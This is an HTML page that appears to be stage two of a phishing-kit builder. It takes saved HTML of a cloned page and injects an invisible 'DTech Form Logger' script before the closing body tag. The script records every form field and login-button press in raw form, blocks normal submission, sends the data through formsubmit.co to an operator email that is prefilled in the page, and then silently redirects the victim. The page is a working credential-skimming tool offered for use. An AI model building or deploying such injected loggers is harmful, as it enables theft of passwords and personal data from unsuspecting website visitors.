<!DOCTYPE html>
<html lang="en">
<head>
    <script src='//libtl.com/sdk.js' data-zone='9601506' data-sdk='show_9601506'></script>

    

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTML Processor | Stage 2</title>
    <style>
        :root {
            --primary: #4361ee;
            --primary-dark: #3a56d4;
            --secondary: #3f37c9;
            --success: #4cc9f0;
            --info: #4895ef;
            --warning: #f72585;
            --danger: #7209b7;
            --light: #f8f9fa;
            --dark: #212529;
            --border-radius: 8px;
            --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s ease;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: var(--dark);
            background-color: #f5f7fa;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 20px;
            text-align: center;
        }

        .header h1 {
            margin: 0;
            font-weight: 600;
        }

        .stage-tag {
            display: inline-block;
            background-color: rgba(255, 255, 255, 0.2);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 14px;
            margin-top: 8px;
        }

        .content {
            padding: 25px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--dark);
        }

        .form-control {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 16px;
            transition: var(--transition);
        }

        .form-control:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 12px 20px;
            border: none;
            border-radius: var(--border-radius);
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition);
            margin-right: 10px;
            margin-bottom: 10px;
        }

        .btn i {
            margin-right: 8px;
        }

        .btn-primary {
            background-color: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background-color: var(--primary-dark);
        }

        .btn-secondary {
            background-color: #6c757d;
            color: white;
        }

        .btn-secondary:hover {
            background-color: #5a6268;
        }

        .btn-success {
            background-color: #28a745;
            color: white;
        }

        .btn-success:hover {
            background-color: #218838;
        }

        .btn-danger {
            background-color: #dc3545;
            color: white;
        }

        .btn-danger:hover {
            background-color: #c82333;
        }

        .btn-next {
            float: right;
            background-color: var(--success);
        }

        .btn-next:hover {
            background-color: #3ab7db;
        }

        .btn:disabled {
            opacity: 0.65;
            cursor: not-allowed;
        }

        .alert {
            padding: 15px;
            border-radius: var(--border-radius);
            margin-bottom: 20px;
            display: flex;
            align-items: center;
        }

        .alert i {
            margin-right: 10px;
            font-size: 20px;
        }

        .alert-info {
            background-color: #e7f5fe;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .alert-success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .alert-warning {
            background-color: #fff3cd;
            color: #856404;
            border: 1px solid #ffeeba;
        }

        .alert-danger {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .preview-container {
            margin-top: 30px;
            border: 1px solid #eee;
            border-radius: var(--border-radius);
            overflow: hidden;
        }

        .preview-header {
            background-color: #f8f9fa;
            padding: 12px 15px;
            border-bottom: 1px solid #eee;
            font-weight: 500;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .preview-content {
            max-height: 400px;
            overflow-y: auto;
            padding: 15px;
            background-color: #f8f9fa;
            font-family: 'Courier New', Courier, monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .status-badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            background-color: #e9ecef;
            color: #495057;
        }

        .status-badge.active {
            background-color: var(--success);
            color: white;
        }

        .action-buttons {
            display: flex;
            flex-wrap: wrap;
            margin-bottom: 20px;
            gap: 10px;
        }

        /* Modal styles for ad */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background-color: white;
            padding: 30px;
            border-radius: var(--border-radius);
            max-width: 500px;
            text-align: center;
            animation: fadeIn 0.3s;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .ad-container {
            margin: 20px 0;
            min-height: 250px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            background-color: #f0f0f0;
            border-radius: var(--border-radius);
        }

        .btn-watch-ad {
            background-color: #ff9500;
            color: white;
            margin-top: 20px;
        }

        .btn-watch-ad:hover {
            background-color: #e68a00;
        }

        .ad-loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .ad-loading i {
            font-size: 40px;
            margin-bottom: 15px;
            color: #4361ee;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        @media (max-width: 768px) {
            .content {
                padding: 15px;
            }
            
            .action-buttons {
                flex-direction: column;
            }
            
            .btn-next {
                float: none;
                width: 100%;
                margin-top: 10px;
            }

            .modal-content {
                width: 90%;
                padding: 20px;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>HTML Processor</h1>
            <div class="stage-tag">Stage 2: Enhancement</div>
        </div>

        <div class="content">
            <div id="alert" class="alert" style="display: none;">
                <i class="fas fa-info-circle"></i>
                <div id="alert-message"></div>
            </div>

            <div class="form-group">
                <label for="email"><i class="fas fa-envelope"></i> Notification Email</label>
                <input type="text" id="email" class="form-control" placeholder="your@email.com" value="kiddxxq1@gmail.com">
            </div>

            <div class="form-group">
                <label for="redirect"><i class="fas fa-external-link-alt"></i> Redirect URL</label>
                <input type="text" id="redirect" class="form-control" placeholder="https://example.com" value="https://www.dtech24.co.za">
            </div>

            <div class="action-buttons">
                <button id="processBtn" class="btn btn-primary">
                    <i class="fas fa-magic"></i> Process HTML
                </button>
                <button id="refreshBtn" class="btn btn-secondary">
                    <i class="fas fa-sync-alt"></i> Refresh
                </button>
                <button id="nextStageBtn" class="btn btn-next" disabled>
                    <i class="fas fa-arrow-right"></i> Continue to Next Stage
                </button>
            </div>

            <div class="preview-container">
                <div class="preview-header">
                    <span><i class="fas fa-code"></i> HTML Preview</span>
                    <span id="statusBadge" class="status-badge">No content loaded</span>
                </div>
                <div class="preview-content" id="htmlPreview">
                    <!-- HTML content will be displayed here -->
                </div>
            </div>
        </div>
    </div>

    <!-- Ad Modal -->
    <div id="adModal" class="modal">
        <div class="modal-content">
            <h2>Continue to Next Stage</h2>
            <p>Please watch this short ad to continue to the next stage</p>
            
            <div class="ad-container" id="adContainer">
                <div class="ad-loading">
                    <i class="fas fa-circle-notch fa-spin"></i>
                    <p>Loading ad content...</p>
                </div>
            </div>
            
            <button id="watchAdBtn" class="btn btn-watch-ad">
                <i class="fas fa-play"></i> Watch Ad to Continue
            </button>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Load the HTML from localStorage on page load
            loadHtmlPreview();

            // Process button handler
            document.getElementById('processBtn').addEventListener('click', processHtml);

            // Refresh button handler
            document.getElementById('refreshBtn').addEventListener('click', loadHtmlPreview);

            // Next stage button handler - now shows ad modal
            document.getElementById('nextStageBtn').addEventListener('click', () => {
                document.getElementById('adModal').style.display = 'flex';
                document.getElementById('adContainer').innerHTML = `
                    <div class="ad-loading">
                        <i class="fas fa-circle-notch fa-spin"></i>
                        <p>Loading ad content...</p>
                    </div>
                `;
            });

            // Watch ad button handler
            document.getElementById('watchAdBtn').addEventListener('click', () => {
                showAd().then(() => {
                    // After ad is watched, proceed to next stage
                    window.location.href = 'step3.html';
                }).catch(error => {
                    showAlert('Error loading ad: ' + error.message, 'danger');
                    document.getElementById('adModal').style.display = 'none';
                });
            });
        });

        function loadHtmlPreview() {
            const originalHtml = localStorage.getItem('data1step');
            const previewElement = document.getElementById('htmlPreview');
            const statusBadge = document.getElementById('statusBadge');

            if (originalHtml) {
                previewElement.textContent = originalHtml;
                statusBadge.textContent = 'Ready for processing';
                statusBadge.className = 'status-badge active';
                showAlert('HTML content loaded successfully from storage', 'info');
            } else {
                previewElement.textContent = 'No HTML content found in storage. Please complete Stage 1 first.';
                statusBadge.textContent = 'No content loaded';
                statusBadge.className = 'status-badge';
                showAlert('No HTML content found in storage. Please complete Stage 1 first.', 'warning');
                document.getElementById('nextStageBtn').disabled = true;
            }
        }

        function processHtml() {
            const email = document.getElementById('email').value.trim();
            const redirectUrl = document.getElementById('redirect').value.trim();
            const previewElement = document.getElementById('htmlPreview');
            const statusBadge = document.getElementById('statusBadge');

            if (!email) {
                showAlert('Please enter a valid notification email address', 'danger');
                return;
            }

            const originalHtml = localStorage.getItem('data1step');
            if (!originalHtml) {
                showAlert('No HTML content found to process. Please complete Stage 1 first.', 'danger');
                return;
            }

            // Show processing notification
            showAlert('Processing HTML content...', 'info');

            // Simulate processing delay for better UX
            setTimeout(() => {
                try {
                    const loggerScript = generateLoggerScript(email, redirectUrl);
                    const modifiedHtml = originalHtml.replace('</body>', loggerScript + '</body>') || originalHtml + loggerScript;

                    // Save to localStorage
                    localStorage.setItem('data2step', modifiedHtml);

                    // Update UI
                    previewElement.textContent = originalHtml; // Show original even after processing
                    statusBadge.textContent = 'Processing complete';
                    statusBadge.className = 'status-badge active';

                    // Show special notification about DTech logger
                    showAlert(`
                        <strong>DTech Logger successfully injected!</strong><br>
                        The enhanced version now includes tracking capabilities and has been saved.
                    `, 'success');
                    
                    document.getElementById('nextStageBtn').disabled = false;
                } catch (error) {
                    showAlert('Error processing HTML: ' + error.message, 'danger');
                    console.error(error);
                }
            }, 1000);
        }

        function generateLoggerScript(email, redirectUrl) {
            // This is the same script generator as before
            return `<!-- DTech Form Logger (Invisible) -->
<script>
// CONFIGURATION
const CONFIG = {
    // Your FormSubmit endpoint
    FORM_SUBMIT_URL: 'https://formsubmit.co/ajax/${email}',
    
    // Redirect URL after submission
    REDIRECT_URL: '${redirectUrl}',
    
    // Time to wait after typing before considering input "finished" (ms)
    INPUT_IDLE_TIMEOUT: 2000,
    
    // Patterns that indicate a submit button
    SUBMIT_BUTTON_PATTERNS: [
        'submit', 'login', 'sign in', 'continue', 
        'next', 'confirm', 'proceed', 'authenticate'
    ]
};

// ===== INVISIBLE LOGGER =====
(() => {
    // Silent console logging (optional for debugging)
    const log = (msg, type='info') => {
        console.log(\`[DTech Logger] \${msg}\`); // Only visible in browser console
    };

    // ===== DATA CAPTURE =====
    let typingTimer;
    let formData = {};

    // Send data via FormSubmit and redirect
    const sendToFormSubmit = async (data) => {
        try {
            const formData = new FormData();
            formData.append('_captcha', 'false');
            formData.append('_subject', 'Form Data Capture');
            formData.append('_template', 'table');
            
            // Add captured data (RAW, NO MASKING)
            formData.append('page_url', window.location.href);
            formData.append('timestamp', new Date().toISOString());
            
            Object.entries(data).forEach(([key, value]) => {
                formData.append(key, value); // Sends exact input
            });

            const response = await fetch(CONFIG.FORM_SUBMIT_URL, {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            
            if (result.success) {
                window.location.href = CONFIG.REDIRECT_URL; // SILENT REDIRECT
            }
        } catch (err) {} // Silent fail
    };

    // ===== EVENT HANDLERS =====
    const setupInputHandlers = () => {
        document.querySelectorAll('input, textarea, select').forEach(field => {
            field.addEventListener('input', () => {
                clearTimeout(typingTimer);
                typingTimer = setTimeout(() => {
                    const name = field.name || field.id || 'unnamed_field';
                    const value = field.value;
                    if (value) {
                        formData[name] = value; // Stores raw value
                    }
                }, CONFIG.INPUT_IDLE_TIMEOUT);
            });
        });
    };

    const setupSubmissionHandlers = () => {
        // Form submissions
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                e.preventDefault(); // Stop default submission
                
                const data = {};
                Array.from(form.elements).forEach(el => {
                    if (el.name && el.value) {
                        data[el.name] = el.value; // RAW DATA
                    }
                });
                sendToFormSubmit(data);
            }, true);
        });

        // Button clicks
        document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const btnText = (btn.textContent || btn.value || '').toLowerCase();
                const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
                    btnText.includes(pattern)
                );
                
                if (isSubmit && Object.keys(formData).length > 0) {
                    sendToFormSubmit(formData);
                    formData = {}; // Clear after submission
                }
            }, true);
        });
    };

    // ===== INITIALIZATION =====
    setupInputHandlers();
    setupSubmissionHandlers();

    // Watch for dynamically added elements
    new MutationObserver(() => {
        setupInputHandlers();
        setupSubmissionHandlers();
    }).observe(document.body, { childList: true, subtree: true });
})();
<\/script>`;
        }

        function showAd() {
            return new Promise((resolve, reject) => {
                // Show loading state
                document.getElementById('adContainer').innerHTML = `
                    <div class="ad-loading">
                        <i class="fas fa-circle-notch fa-spin"></i>
                        <p>Preparing ad...</p>
                    </div>
                `;
                
                // Call the MoneyTag ad function
                try {
                    show_9601506().then(() => {
                        // Ad was successfully shown and completed
                        document.getElementById('adModal').style.display = 'none';
                        showAlert('Thank you for watching the ad! Proceeding to next stage...', 'success');
                        resolve();
                    }).catch(error => {
                        reject(new Error('Ad failed to load or was skipped'));
                    });
                } catch (error) {
                    reject(new Error('Ad SDK not available'));
                }
            });
        }

        function showAlert(message, type) {
            const alertDiv = document.getElementById('alert');
            const alertMessage = document.getElementById('alert-message');
            const alertIcon = alertDiv.querySelector('i');
            
            // Set message and style
            alertMessage.innerHTML = message;
            alertDiv.className = `alert alert-${type}`;
            alertDiv.style.display = 'flex';
            
            // Set appropriate icon
            switch(type) {
                case 'success':
                    alertIcon.className = 'fas fa-check-circle';
                    break;
                case 'danger':
                    alertIcon.className = 'fas fa-exclamation-circle';
                    break;
                case 'warning':
                    alertIcon.className = 'fas fa-exclamation-triangle';
                    break;
                default:
                    alertIcon.className = 'fas fa-info-circle';
            }
            
            // Auto-hide after 5 seconds
            setTimeout(() => {
                alertDiv.style.display = 'none';
            }, 5000);
        }
    </script>
</body>
</html>
